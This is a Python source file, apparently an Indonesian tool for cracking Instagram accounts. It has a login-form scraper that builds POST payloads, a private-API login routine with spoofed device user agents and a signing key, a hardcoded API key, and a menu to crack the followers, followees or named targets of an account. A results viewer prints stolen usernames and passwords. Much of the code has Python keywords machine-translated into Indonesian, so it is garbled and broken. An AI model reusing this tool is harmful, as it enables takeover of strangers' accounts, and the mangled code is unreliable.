    header = {"apikey": "2ZxXnjQByF6rPu3GM5DtcEmrJfKqB5xL"}
    
    # Main menu #
    
  #  os.system('clear')
    try:
        response = requests.get(url,headers=header)
        if response.status_code == 200:
            uascrap.append(response.json()['ua'])
        else:
            uascrap.append("Mozilla/5.0 (Linux; Android 11; BrayennnFB) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36")
    except requests.exceptions.ConnectionError:
        uascrap.append("Mozilla/5.0 (Linux; Android 11; BrayennnFB) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36")
		  
#-----------------------[ DEFF SCRAPT METODE ]--------------------#
from bs4 import BeautifulSoup as bs
from datetime import datetime
from itertools import count 
from requests import get 
from bs4 import BeautifulSoup 
from rich import print as cetak
from rich import print as prints
from rich.panel import Panel as nel
done = False 
results = [] 

def clear():
    if "linux" in sys.platform.lower():os.system("clear")
    elif "win" in sys.platform.lower():os.system("cls")

def start():
    global Mulai_Jalan
    Mulai_Jalan = datetime.now()
def akhir():
    global Akhir_Jalan, Total_Waktu
    Akhir_Jalan = datetime.now()
    Total_Waktu = Akhir_Jalan - Mulai_Jalan
    try:
        Menit = str(Total_Waktu).split(':')[1]
        Detik = str(Total_Waktu).split(':')[2].replace('.',',').split(',')[0] + ',' + str(Total_Waktu).split(':')[2].replace('.',',').split(',')[1][:1]
        print('\n {P}[{H}+{P}]\33[1;96m Program Selesai Dalam Waktu %s Menit %s Detik\n'%(Menit,Detik))
    except Exception as e:
        print('\n\n {P}[{H}+{P}]\33[1;96m Program Selesai Dalam Waktu 0 Detik\n')

class get_data_web:
    
    def __init__(self):
        self.xyz = requests.Session()
        url = input(' {P}[{H}+{P}]\33[1;96m Masukkan URL : ')
        print('\n {P}[{H}+{P}]\33[1;96m Source Payload')
        print(' {P}[{H}+{P}]\33[1;96m Parsed Payload')
        print(' {P}[{H}+{P}]\33[1;96m Source Code Post Requests')
        self.tanya = input(' {P}[{H}+{P}]\33[1;96m Pilih : {P}')
        self.domain = url.split('/')[2]
        self.get_form(url)
       
    def get_form(self,url):
        req = self.xyz.get(url)
        raq = bs(req.content,'html.parser')
        for x in raq.find_all('form'):
            if self.tanya in ['1','01','a']: self.printing1(req,x)
            elif self.tanya in ['2','02','b']: self.printing2(req,x)
            elif self.tanya in ['3','03','c']: self.printing3(url,req,x)
            else: exit('\n {P}[{H}+{P}]\33[1;91m Isi Yang Benar Asu')

    def get_head1(self,req):
        data = {}
        head = req.headers
        usls = ['cookie','set-cookie','report-to','expires','x-fb-debug','date','last-modified','etag']
        for x,y in zip(head.keys(),head.values()):
            try:
                if x.lower() in usls: continue
                else: data.update({x:y})
            except Exception as e:continue
        return(data)

    def get_data1(self,form):
        data = {}
        for y in form.find_all('input'):
            try:data.update({y['name']:y['value']})
            except Exception as e:continue
        return(data)

    def get_data2(self,form):
        data = []
        for y in form.find_all('input'):
            try:data.append(y)
            except Exception as e:continue
        return(data)

    def get_post1(self,form):
        z = form['action']
        if 'https://'+self.domain in z: return(z)
        elif 'http://'+self.domain in z: return(z)
        else: return('https://%s%s'%(self.domain,z))

    def printing1(self,req,x):
        head = self.get_head1(req)
        data = self.get_data1(x)
        post = self.get_post1(x)
        coki = self.xyz.cookies.get_dict()
        print('\n\n[SOURCE PAYLOAD]\n')
        print('[Host] %s'%(self.domain))
        print('[Head] %s'%(head))
        print('[Data] %s'%(data))
        print('[Coki] %s'%(coki))
        print('[Post] %s'%(post))

    def printing2(self,req,x):
        head = self.get_head1(req)
        data = self.get_data2(x)
        post = self.get_post1(x)
        coki = self.xyz.cookies.get_dict()
        print('\n\n[PARSED PAYLOAD]\n')
        print('head = {')
        for x,y in zip(head.keys(),head.values()):
            print('    %s%s: %s'%(x,' '*(29-len(x)),y))
        print('    }')
        print('data = {')
        for x in data:
            try:
                if 'value' in str(x):
                    dp = 'name=' + re.search('name=(.*?)/>',str(x)).group(1)
                    fp = re.search('value="(.*?)"',str(dp)).group(1)
                    print("    %s%s: '%s',"%(x['name'],' '*(19-len(x['name'])),fp))
                elif 'name' in str(x):
                    print("    %s%s: '',"%(x['name'],' '*(19-len(x['name']))))
                else: continue
            except Exception as e: continue
        print('    }')
        print('cookie = {')
        for x,y in zip(coki.keys(),coki.values()):
            print('    %s%s: %s'%(x,' '*(5-len(x)),y))
        print('    }')
        print("next = '%s'"%(post))
        print("post = requests.Session().post(next,headers=head,data=data,cookies=cookie)")
    def printing3(self,url,req,x):
        head = self.get_head1(req)
        data = self.get_data2(x)
        post = self.get_post1(x)
        print('\n\n[SOURCE CODE POST REQUESTS]\n')
        print("url  = '%s'"%(url))
        print("requ = bs(requests.Session().get(url).content,'html.parser')")
        print('head = {')
        for x,y in zip(head.keys(),head.values()):
            print('    %s%s: %s'%(x,' '*(29-len(x)),y))
        print('    }')
        print('data = {')
        for x in data:
            try:
                if 'value' in str(x):
                    dp = 'name=' + re.search('name=(.*?)/>',str(x)).group(1)
                    fp = re.search('value="(.*?)"',str(dp)).group(1)
                    gp = dp.replace(fp,'(.*?)')
                    rs = ("re.search('%s',str(requ)).group(1)"%(gp))
                    print('    %s%s: %s,'%(x['name'],' '*(19-len(x['name'])),rs))
                elif 'name' in str(x):
                    print("    %s%s: '',"%(x['name'],' '*(19-len(x['name']))))
                else: continue
            except Exception as e: continue
        print('    }')
        print("cookie = requests.Session().cookies.get_dict()")
        print("next = '%s'"%(post))
        print("post = requests.Session().post(next,headers=head,data=data,cookies=cookie)")

#CEK HASIL IGEH
def hasil_igehh():
	mencetak('')
	untuk saya di os.listdir('IG'):
		print("%s•%s> %s%s"%(U,M,J,i));jeda(0.07)
	mencoba:
		c=input("\n%s•%s masukan berkas %s:%s "%(U,O,M,K))
		jika c di['']:
			exit("\n%s• isi yang benar kentod"%(M))
		g=buka("IG/%s"%(c)).baca().splitlines()
	kecuali FileNotFoundError:
		exit("\n%s• file tidak tersedia"%(M))
	xx=c.split("-")
	xc=xx[0]
	print(" %s# %s---------------------------------------- %s #"%(P,M,P));jeda(2)
	print('%s%s%s Total akun %s: %s%s '%(U,til,O,M,H,len(g)))
	print(" %s# %s---------------------------------------- %s #"%(P,M,P));jeda(2)
	untuk s dalam g:
		usr=s.split("|")[0]
		pwd=s.split("|")[1]
		fol=s.split("|")[2]
		ful=s.split("|")[3]
		jika xc=="CP":
			print(f"""{J}╔══[ {K}Pos pemeriksaan                      
{J}║══[ {K}Nama Pengguna {M}> {K}{usr}{C}
{J}║══[ {K}Kata Sandi {M}> {K}{pwd}{C}
{J}║══[ {K}Pengikut {M}> {K}{fol}{C}
{J}╚══[ {K}Mengikuti {M}> {K}{ful}{C}
			""");jeda(0,05)
		kalau tidak:
			print(f"""{J}╔══[ {H}Berhasil                      
{J}║══[ {H}Nama Pengguna {M}> {H}{usr}{C}
{J}║══[ {H}Kata Sandi {M}> {H}{pwd}{C}
{J}║══[ {H}Pengikut {M}> {H}{fol}{C}
{J}╚══[ {H}Mengikuti {M}> {H}{ful}{C}
			""");jeda(0,05)

#-------------------------------------------------#
#---{ CRACK INSTAGRAM }---#
#---------------------------------------------#
hari=datetime.now().strftime("%d-%b-%Y")
nyMnD = 5
nyMxD = 10

insta_log='https://www.instagram.com/accounts/login/?force_classic_login=&'
url='https://www.instagram.com'

USN="Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/86.0.4240.198 Seluler Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)"

internal=[]
eksternal=[]
sukses=[]
pos pemeriksaan=[]
putaran=0
mengikuti=[]
s=permintaan.Sesi()

mencoba:
    # python 2
	urllib_quote_plus = urllib.quote
kecuali:
    # python3
	urllib_quote_plus = urllib.parse.quote_plus

def cekAPI(cookie):
	pengguna=buka('.namapengguna','r').baca()
	mencoba:
		c=requests.get("https://www.instagram.com/%s/?__a=1"%(user),cookies={'cookie':cookie},headers={"user-agent":USN })
		i=c.json()["graphql"]["pengguna"]
		nama=i["nama_lengkap"]
		followers=i["edge_followed_by"]["count"]
		berikut=i["Edge_ikuti"]["menghitung"]
		external.append(f'{nama}|{pengikut}|{mengikuti}')
	kecuali ValueError:
		print(f'{M} ! Pos Pemeriksaan Instagram');jeda(4)
		os.hapus('.kukis.log')
		os.hapus('.namapengguna')
		KELUAR()
	mengembalikan eksternal, pengguna

def checkin():
	mencoba:
		kuki=buka('.kukis.log','r').baca()
	kecuali FileNotFoundError:
		Gabung()
	ex,pengguna=cekAPI(kuki)
	kuki={'kuki':kuki}
	instagram(misal,pengguna,cookie).menu()

pasti login():
	eksternal global
	mencoba:
		os.system('hapus')
		catet_req = ('# Login dengan akun instagram anda dan pastikan akun bersifat publik. Jika login checkpoint wajib gunakan akun baru, buat akun baru lewat browser chrome')
		requ = rich.markdown.Markdown(catet_req, style='hijau')
		rich.console.Console().print(requ)
		us=input('%s%s %nama pengguna%s > %s'%(U,til,O,M,K))
		pw=stdiomask.getpass(prompt='%s%s %spassword%s > %s'%(U,til,O,M,K))
	kecuali KeyboardInterupsi:
		exit('%s ! Terhenti '%(M))
		
	x=instagramAPI(us,pw).loginAPI()
	jika x.get('status')=='berhasil':
		buka('.namapengguna','a').tulis(kami)
		open('.kukis.log','a').write(x.get('cookie'))
		cookie={'cookie':x.get('cookie')}
		print ('\n%s%s Login berhasil √'%(H,til));jeda(2)
		mendaftar()
	elif x.get('status')=='pos pemeriksaan':
		exit ('\n%s%s Akun terkena sesi '%(M,til));jeda(2)
	kalau tidak:
		exit ('\n%s%s Login gagal, silahkan coba lagi '%(M,til));jeda(2)

def User_Agent():
	dpi_telepon = [
		'133', '320', '515', '160', '640', '240', '120'
		'800', '480', '225', '768', '216', '1024']
	model_telepon = [
		'Nokia 2.4', 'HUAWEI', 'Galaxy',
		'Smartphone Tidak Terkunci', 'Nexus 6P',
		'Ponsel', 'Xiaomi',
		'samsung', 'OnePlus']
	pxl_phone = [
		'623x1280','700x1245','800x1280',
		'1080x2340','1320x2400','1242x2688']
	i_versi = [
		'114.0.0.20.2', '114.0.0.38.120',
		'114.0.0.20.70', '114.0.0.28.120',
		'114.0.0.0.24', '114.0.0.0.41']
	User_Agent = f'Instagram '+random.choice(i_version)+' Android (30/3.0; '+random.choice(dpi_phone)+'dpi; '+random.choice(pxl_phone)+'; huawei/google; '+ random.choice(model_phone)+'; pemancing; pemancing; en_US)'
	mengembalikan User_Agent

def user_agent():
	resolusi = ['720x1280', '320x480', '480x800', '1024x768', '1280x720', '768x1024', '480x320']
	versi = ['GT-N7000', 'SM-N9000', 'GT-I9220', 'GT-I9100']
	dpis = ['120', '160', '320', '240']
	ver = acak.pilihan(versi)
	dpi = acak.pilihan(dpis)
	res = acak.pilihan(resolusi)
	kembali (
		'Instagram 4.{}.{} '
		'Android ({}/{}.{}.{}; {}; {}; samsung; {}; {}; smdkc210; en_US)'
	).format(
		acak.randint(1, 2),
		acak.randint(0, 2),
		acak.randint(10, 11),
		acak.randint(1, 3),
		acak.randint(3, 5),
		acak.randint(0, 5),
		dpi,
		soal,
		ver,
		ver,
	)

def user_agentAPI():
	APP_VERSION = "136.0.0.34.124"
	VERSION_CODE = "208061712"
	PERANGKAT = {
		"one_plus_7": {"app_version": APP_VERSION,"android_version": "29","android_release": "10.0","dpi": "420dpi","resolusi": "1080x2340","produsen": "OnePlus" ,"perangkat": "GM1903","model": "OnePlus7","cpu": "qcom","version_code": VERSION_CODE},
		"one_plus_3": {"app_version": APP_VERSION,"android_version": "28","android_release": "9.0","dpi": "420dpi","resolusi": "1080x1920","produsen": "OnePlus" ,"perangkat": "ONEPLUS A3003","model": "OnePlus3","cpu": "qcom","version_code": VERSION_CODE},
		"samsung_galaxy_s7": {"app_version": APP_VERSION,"android_version": "26","android_release": "8.0","dpi": "640dpi","resolusi": "1440x2560","produsen": "samsung" ,"device": "SM-G930F","model": "herolte","cpu": "samsungexynos8890","version_code": VERSION_CODE},
		"huawei_mate_9_pro": {"app_version": APP_VERSION,"android_version": "24","android_release": "7.0","dpi": "640dpi","resolusi": "1440x2560","produsen": "HUAWEI" ,"perangkat": "LON-L29","model": "HWLON","cpu": "hi3660","version_code": VERSION_CODE},
		"samsung_galaxy_s9_plus": {"app_version": APP_VERSION,"android_version": "28","android_release": "9.0","dpi": "640dpi","resolution": "1440x2560","produsen": "samsung" ,"device": "SM-G965F","model": "star2qltecs","cpu": "samsungexynos9810","version_code": VERSION_CODE},
		"one_plus_3t": {"app_version": APP_VERSION,"android_version": "26","android_release": "8.0","dpi": "380dpi","resolusi": "1080x1920","produsen": "OnePlus" ,"perangkat": "ONEPLUS A3010","model": "OnePlus3T","cpu": "qcom","version_code": VERSION_CODE},
		"lg_g5": {"app_version": APP_VERSION,"android_version": "23","android_release": "6.0.1","dpi": "640dpi","resolusi": "1440x2392","produsen": " LGE/lge","device": "RS988","model": "h1","cpu": "h1","version_code": VERSION_CODE},
		"zte_axon_7": {"app_version": APP_VERSION,"android_version": "23","android_release": "6.0.1","dpi": "640dpi","resolution": "1440x2560","produsen": " ZTE","device": "ZTE A2017U","model": "ailsa_ii","cpu": "qcom","version_code": VERSION_CODE},
		"samsung_galaxy_s7_edge": {"app_version": APP_VERSION,"android_version": "23","android_release": "6.0.1","dpi": "640dpi","resolution": "1440x2560","produsen": " samsung","device": "SM-G935","model": "hero2lte","cpu": "samsungexynos8890","version_code": VERSION_CODE},}
	DEFAULT_DEVICE = random.choice(daftar(DEVICES.keys()))
	app_version = PERANGKAT[DEFAULT_DEVICE]['app_version']
	android_version = PERANGKAT[DEFAULT_DEVICE]['android_version']
	android_release = PERANGKAT[DEFAULT_DEVICE]['android_release']
	dpi = PERANGKAT[DEFAULT_DEVICE]['dpi']
	resolusi = PERANGKAT[DEFAULT_DEVICE]['resolusi']
	produsen = PERANGKAT[DEFAULT_DEVICE]['produsen']
	perangkat = PERANGKAT[DEFAULT_DEVICE]['perangkat']
	model = PERANGKAT[DEFAULT_DEVICE]['model']
	cpu = PERANGKAT[DEFAULT_DEVICE]['cpu']
	kode_versi = PERANGKAT[DEFAULT_DEVICE]['kode_versi']
	USER_AGENT_BASE = f"Instagram {app_version} "+f"Android ({android_version}/{android_release}; "+f"{dpi}; {resolusi}; {produsen}; "+f"{perangkat}; {model}; {cpu}; en_US; {version_code})"
	kembali USER_AGENT_BASE

kelas instagramAPI:
	API_URL = 'https://i.instagram.com/api/v1/'
	DEVICE_SETTINTS = {'produsen': 'Xiaomi',
		'model': 'HM 1SW',
		'android_version': 18,
		'android_release': '4.3'}
	USER_AGENT = 'Instagram 10.26.0 Android ({android_version}/{android_release}; 320dpi; 720x1280; {produsen}; {model}; armani; qcom; en_US)'.format(**DEVICE_SETTINTS)
	IG_SIG_KEY = '4f8732eb9ba7d1c8e8897a75d6474d4eb3f5279137431b2aafb71fafe2abe178'
	EXPERIMENTS = 'ig_promote_reach_objective_fix_universe,ig_android_universe_video_production,ig_search_client_h1_2017_holdout,ig_android_live_follow_from_comments_universe,ig_android_carousel_non_square_creation,ig_android_live_analytics,ig_android_follow_all_dialog_confirmation_copy,ig_android_stories_server_coverframe,ig_android_video_captions_universe,ig_android_offline_location_feed,ig_android_direct_inbox_retry_seen_state,ig_android_ontact_invite_universe,ig_android_live_broadcast_blacklist,ig_android_insta_video_reconnect_viewers,ig_android_ad_async_ads_universe,ig_android_search_clear_layout_universe,ig_android_shopping_reporting,ig_android_stories_surface_universe,ig_android_verified_comments_universe,ig_android_preload_media_ahead_in_current_reel,android_instagram_prefetch_suggestions_universe,ig_android_reel_viewer_fetch_missing_reels_universe,ig_android_direct_search_share_sheet_universe,ig_android_business_promote_tooltip,ig_android_direct_blue_tab,ig_android_async_network_tweak_universe,ig_android_elevate_main_thread_priority_universe,ig_android_stories_gallery_nux,ig_android_instavideo_remove_nux_comments,ig_video_copyright_whitelist,ig_react_native_inline_insights_with_relay,ig_android_direct_thread_message_animation,ig_android_draw_rainbow_client_universe,ig_android_direct_link_style,ig_android_live_heart_enhancements_universe,ig_android_rtc_reshare,ig_android_preload_item_count_in_reel_viewer_buffer,ig_android_users_bootstrap_service,ig_android_auto_retry_post_mode,ig_android_shopping,ig_android_main_feed_seen_state_dont_send_info_on_tail_load,ig_fbns_preload_default,ig_android_gesture_dismiss_reel_viewer,ig_android_tool_tip,ig_android_ad_logger_funnel_logging_universe,ig_android_gallery_grid_column_count_universe,ig_android_business_new_ads_payment_universe,ig_android_direct_links,ig_android_audience_control,ig_android_live_encore_consumption_settings_universe,ig_perf_android_holdout,ig_android_cache_contact_import_list,ig_android_links_receivers,ig_android_ad_impression_backtest,ig_android_list_redesign,ig_android_stories_separate_overlay_creation,ig_android_stop_video_recording_fix_universe,ig_android_render_video_segmentation,ig_android_live_encore_reel_chaining_universe,ig_android_sync_on_background_enhanced_10_25,ig_android_immersive_viewer,ig_android_mqtt_skywalker,ig_fbns_push,ig_android_ad_watchmore_overlay_universe,ig_android_react_native_universe,ig_android_profile_tabs_redesign_universe,ig_android_live_consumption_abr,ig_android_story_viewer_social_context,ig_android_hide_post_in_feed,ig_android_video_loopcount_int,ig_android_enable_main_feed_reel_tray_preloading,ig_android_camera_upsell_dialog,ig_android_ad_watchbrowse_universe,ig_android_internal_research_settings,ig_android_search_people_tag_universe,ig_android_react_native_ota,ig_android_enable_concurrent_request,ig_android_react_native_stories_grid_view,ig_android_business_stories_inline_insights,ig_android_log_mediacodec_info,ig_android_direct_expiring_media_loading_errors,ig_video_use_sve_universe,ig_android_cold_start_feed_request,ig_android_enable_zero_rating,ig_android_reverse_audio,ig_android_branded_content_three_line_ui_universe,ig_android_live_encore_production_universe,ig_stories_music_sticker,ig_android_stories_teach_gallery_location,ig_android_http_stack_experiment_2017,ig_android_stories_device_tilt,ig_android_pending_request_search_bar,ig_android_fb_topsearch_sgp_fork_request,ig_android_seen_state_with_view_info,ig_android_animation_perf_reporter_timeout,ig_android_new_block_flow,ig_android_story_tray_title_play_all_v2,ig_android_direct_address_links,ig_android_stories_archive_universe,ig_android_save_collections_cover_photo,ig_android_live_webrtc_livewith_production,ig_android_sign_video_url,ig_android_stories_video_prefetch_kb,ig_android_stories_create_flow_favorites_tooltip,ig_android_live_stop_broadcast_on_404,ig_android_live_viewer_invite_universe,ig_android_promotion_feedback_channel,ig_android_render_iframe_interval,ig_android_accessibility_logging_universe,ig_android_camera_shortcut_universe,ig_android_use_one_cookie_store_per_user_override,ig_profile_holdout_2017_universe,ig_android_stories_server_brushes,ig_android_ad_media_url_logging_universe,ig_android_shopping_tag_nux_text_universe,ig_android_comments_single_reply_universe,ig_android_stories_video_loading_spinner_improvements,ig_android_collections_cache,ig_android_comment_api_spam_universe,ig_android_facebook_twitter_profile_photos,ig_android_shopping_tag_creation_universe,ig_story_camera_reverse_video_experiment,ig_android_direct_bump_selected_recipients,ig_android_ad_cta_haptic_feedback_universe,ig_android_vertical_share_sheet_experiment,ig_android_family_bridge_share,ig_android_search,ig_android_insta_video_consumption_titles,ig_android_stories_gallery_preview_button,ig_android_fb_auth_education,ig_android_camera_universe,ig_android_me_only_universe,ig_android_instavideo_audio_only_mode,ig_android_user_profile_chaining_icon,ig_android_live_video_reactions_consumption_universe,ig_android_stories_hashtag_text,ig_android_post_live_badge_universe,ig_android_swipe_fragment_container,ig_android_search_users_universe,ig_android_live_save_to_camera_roll_universe,ig_creation_growth_holdout,ig_android_sticker_region_tracking,ig_android_unified_inbox,ig_android_live_new_watch_time,ig_android_offline_main_feed_10_11,ig_import_biz_contact_to_page,ig_android_live_encore_consumption_universe,ig_android_experimental_filters,ig_android_search_client_matching_2,ig_android_react_native_inline_insights_v2,ig_android_business_conversion_value_prop_v2,ig_android_redirect_to_low_latency_universe,ig_android_ad_show_new_awr_universe,ig_family_bridges_holdout_universe,ig_android_background_explore_fetch,ig_android_following_follower_social_context,ig_android_video_keep_screen_on,ig_android_ad_leadgen_relay_modern,ig_android_profile_photo_as_media,ig_android_insta_video_consumption_infra,ig_android_ad_watchlead_universe,ig_android_direct_prefetch_direct_story_json,ig_android_shopping_react_native,ig_android_top_live_profile_pics_universe,ig_android_direct_phone_number_links,ig_android_stories_weblink_creation,ig_android_direct_search_new_thread_universe,ig_android_histogram_reporter,ig_android_direct_on_profile_universe,ig_android_network_cancellation,ig_android_background_reel_fetch,ig_android_react_native_insights,ig_android_insta_video_audio_encoder,ig_android_family_bridge_bookmarks,ig_android_data_usage_network_layer,ig_android_universal_instagram_deep_links,ig_android_dash_for_vod_universe,ig_android_modular_tab_discover_people_redesign,ig_android_mas_sticker_upsell_dialog_universe,ig_android_ad_add_per_event_counter_to_logging_event,ig_android_sticky_header_top_chrome_optimization,ig_android_rtl,ig_android_biz_conversion_page_pre_select,ig_android_promote_from_profile_button,ig_android_live_broadcaster_invite_universe,ig_android_share_spinner,ig_android_text_action,ig_android_own_reel_title_universe,ig_promotions_unit_in_insights_landing_page,ig_android_business_settings_header_univ,ig_android_save_longpress_tooltip,ig_android_constrain_image_size_universe,ig_android_business_new_graphql_endpoint_universe,ig_ranking_following,ig_android_stories_profile_camera_entry_point,ig_android_universe_reel_video_production,ig_android_power_metrics,ig_android_sfplt,ig_android_offline_hashtag_feed,ig_android_live_skin_smooth,ig_android_direct_inbox_search,ig_android_stories_posting_offline_ui,ig_android_sidecar_video_upload_universe,ig_android_promotion_manager_entry_point_universe,ig_android_direct_reply_audience_upgrade,ig_android_swipe_navigation_x_angle_universe,ig_android_offline_mode_holdout,ig_android_live_send_user_location,ig_android_direct_fetch_before_push_notif,ig_android_non_square_first,ig_android_insta_video_drawing,ig_android_swipeablefilters_universe,ig_android_live_notification_control_universe,ig_android_analytics_logger_running_background_universe,ig_android_save_all,ig_android_reel_viewer_data_buffer_size,ig_direct_quality_holdout_universe,ig_android_family_bridge_discover,ig_android_react_native_restart_after_error_universe,ig_android_startup_manager,ig_story_tray_peek_content_universe,ig_android_profile,ig_android_high_res_upload_2,ig_android_http_service_same_thread,ig_android_scroll_to_dismiss_keyboard,ig_android_remove_followers_universe,ig_android_skip_video_render,ig_android_story_timestamps,ig_android_live_viewer_comment_prompt_universe,ig_profile_holdout_universe,ig_android_react_native_insights_grid_view,ig_stories_selfie_sticker,ig_android_stories_reply_composer_redesign,ig_android_streamline_page_creation,ig_explore_netego,ig_android_ig4b_connect_fb_button_universe,ig_android_feed_util_rect_optimization,ig_android_rendering_controls,ig_android_os_version_blocking,ig_android_encoder_width_safe_multiple_16,ig_search_new_bootstrap_holdout_universe,ig_android_snippets_profile_nux,ig_android_e2e_optimization_universe,ig_android_comments_logging_universe,ig_shopping_insights,ig_android_save_collections,ig_android_live_see_fewer_videos_like_this_universe,ig_android_show_new_contact_import_dialog,ig_android_live_view_profile_from_comments_universe,ig_fbns_blocked,ig_formats_and_feedbacks_holdout_universe,ig_android_reduce_view_pager_buffer,ig_android_instavideo_periodic_notif,ig_search_user_auto_complete_cache_sync_ttl,ig_android_marauder_update_frequency,ig_android_suggest_password_reset_on_oneclick_login,ig_android_promotion_entry_from_ads_manager_universe,ig_android_live_special_codec_size_list,ig_android_enable_share_to_messenger,ig_android_background_main_feed_fetch,ig_android_live_video_reactions_creation_universe,ig_android_channels_home,ig_android_sidecar_gallery_universe,ig_android_upload_reliability_universe,ig_migrate_mediav2_universe,ig_android_insta_video_broadcaster_infra_perf,ig_android_business_conversion_social_context,android_ig_fbns_kill_switch,ig_android_live_webrtc_livewith_consumption,ig_android_destroy_swipe_fragment,ig_android_react_native_universe_kill_switch,ig_android_stories_book_universe,ig_android_all_videoplayback_persisting_sound,ig_android_draw_eraser_universe,ig_direct_search_new_bootstrap_holdout_universe,ig_android_cache_layer_bytes_threshold,ig_android_search_hash_tag_and_username_universe,ig_android_business_promotion,ig_android_direct_search_recipients_controller_universe,ig_android_ad_show_full_name_universe,ig_android_anrwatchdog,ig_android_qp_kill_switch,ig_android_2fac,ig_direct_bypass_group_size_limit_universe,ig_android_promote_simplified_flow,ig_android_share_to_whatsapp,ig_android_hide_bottom_nav_bar_on_discover_people,ig_fbns_dump_ids,ig_android_hands_free_before_reverse,ig_android_skywalker_live_event_start_end,ig_android_live_join_comment_ui_change,ig_android_direct_search_story_recipients_universe,ig_android_direct_full_size_gallery_upload,ig_android_ad_browser_gesture_control,ig_channel_server_experiments,ig_android_video_cover_frame_from_original_as_fallback,ig_android_ad_watchinstall_universe,ig_android_ad_viewability_logging_universe,ig_android_new_optic,ig_android_direct_visual_replies,ig_android_stories_search_reel_mentions_universe,ig_android_threaded_comments_universe,ig_android_mark_reel_seen_on_Swipe_forward,ig_internal_ui_for_lazy_loaded_modules_experiment,ig_fbns_shared,ig_android_capture_slowmo_mode,ig_android_live_viewers_list_search_bar,ig_android_video_single_surface,ig_android_offline_reel_feed,ig_android_video_download_logging,ig_android_last_edits,ig_android_exoplayer_4142,ig_android_post_live_viewer_count_privacy_universe,ig_android_activity_feed_click_state,ig_android_snippets_haptic_feedback,ig_android_gl_drawing_marks_after_undo_backing,ig_android_mark_seen_state_on_viewed_impression,ig_android_live_backgrounded_reminder_universe,ig_android_live_hide_viewer_nux_universe,ig_android_live_monotonic_pts,ig_android_search_top_search_surface_universe,ig_android_user_detail_endpoint,ig_android_location_media_count_exp_ig,ig_android_comment_tweaks_universe,ig_android_ad_watchmore_entry_point_universe,ig_android_top_live_notification_universe,ig_android_add_to_last_post,ig_save_insights,ig_android_live_enhanced_end_screen_universe,ig_android_ad_add_counter_to_logging_event,ig_android_blue_token_conversion_universe,ig_android_exoplayer_settings,ig_android_progressive_jpeg,ig_android_offline_story_stickers,ig_android_gqls_typing_indicator,ig_android_chaining_button_tooltip,ig_android_video_prefetch_for_connectivity_type,ig_android_use_exo_cache_for_progressive,ig_android_samsung_app_badging,ig_android_ad_holdout_watchandmore_universe,ig_android_offline_commenting,ig_direct_stories_recipient_picker_button,ig_insights_feedback_channel_universe,ig_android_insta_video_abr_resize,ig_android_insta_video_sound_always_on'''
	SIG_KEY_VERSION = '4'

	def __init__(self,username,password):
		self.namapengguna=namapengguna
		self.password=kata sandi
		m = hashlib.md5()
		m.update(username.encode('utf-8') + password.encode('utf-8'))
		self.device_id = self.generateDeviceId(m.hexdigest())
		self.uuid = self.generateUUID(Benar)
		self.s = request.Session()

	def generateDeviceId(self, seed):
		volatile_seed = "12345"
		m = hashlib.md5()
		m.update(seed.encode('utf-8') + volatile_seed.encode('utf-8'))
		kembalikan 'android-' + m.hexdigest()[:16]

	def generateUUID(self, type):
		generate_uuid = str(uuid.uuid4())
		jika (jenis):
			mengembalikan generate_uuid
		kalau tidak:
			kembali generate_uuid.replace('-', '')

	def loginAPI(diri):
		token=self.s.get("https://www.instagram.com/",headers={"user-agent":User_Agent()}).text
		crf_token=re.findall(r"\"csrf_token\"\:\"(.*?)\"", str(token))[0]
		self.s.headers.update({'Koneksi': 'tutup',
			'Menerima': '*/*',
			'Content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
			'Cookie2': '$Versi=1',
			'Bahasa Terima': 'en-US',
			'User-Agent': user_agentAPI()})
		self.data = json.dumps({
			'phone_id': self.generateUUID(Benar),
			'_csrftoken': crf_token,
			'nama pengguna': self.nama pengguna,
			'panduan': self.uuid,
			'device_id': self.device_id,
			'password': self.password,
			'login_attempt_count': '0'})
		self.payload = 'signed_body={}.{}&ig_sig_key_version=4'.format(
			self.generateUUID(False),
			urllib.request.quote(self.data)
		)
		x=self.s.post("https://i.instagram.com/api/v1/accounts/login/", self.payload)
		x_jason=json.memuat(x.teks)
		x_kukis=x.cookies.get_dict()
		jika "logged_in_user" di x.text:
			kuki=";".join([v+"="+x_kukis[v] untuk v di x_kukis])
			#id=x_jason['logged_in_user']['pk']
			#nm=x_jason['logged_in_user']['nama_lengkap']
			#pn=x_jason['logged_in_user']['phone_number']
			kembalikan {'status':'success','cookie':kuki,'userame':self.username}
		elif 'challenge_required' di x.text:
			kembalikan {'status':'pos pemeriksaan'}
		kalau tidak:
			kembalikan {'status':'login_error'}
C = ''
instagram kelas:
	def __init__(self,external,username,cookie):
		self.ext=eksternal
		self.namapengguna=namapengguna
		self.cookie=cookie
		self.s=permintaan.Session()

	logo def (diri sendiri):
		os.system('hapus')
		untuk saya di luar:
			mencoba:
				nama=i.split('|')[0]
				pengikut=i.split('|')[1]
				berikut=i.split('|')[2]
			kecuali:
				lulus
		spanduk()
		cetak(f"""
{U}•{P} 01 {O}Crack dari pengikut
{U}•{P} 02 {O}Crack dari mengikuti
{U}•{P} 03 {O}Crack dari pencarian nama
{U}•{P} 04 {O}Crack secara target
{U}•{P} 05 {O}Cek status akun hasil crack
{U}•{P} 06 {O}Bot otomatis berhenti mengikuti
{U}•{P} rm {O}Hapus akun
{U}•{M} 00 {O}Keluar
	""")
	
	menu def (sendiri):
		diri.logo()
		c=input('%s# %sPilih %s> %s'%(P,O,M,K))
		jika c=='':
			print ('\n%s%s isi yang benar'%(M,til));jeda(2)
			self.menu()
		elif c di ('1','01'):
			print ("\n%s%s %sPerlu di ingat target harus bersifat publik "%(U,til,O))
			m=input('%s%s %sUsername target%s > %s'%(U,til,O,M,K))
			id=self.idAPI(self.cookie,m)
			info=self.infoAPI(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/followers/?count=100000',id)
			self.passwordAPI(info)
		elif c di ('2','02'):
			print ("\n%s%s %sPerlu di ingat target harus bersifat publik "%(U,til,O))
			m=input('%s%s %sUsername target%s > %s'%(U,til,O,M,K))
			id=self.idAPI(self.cookie,m)
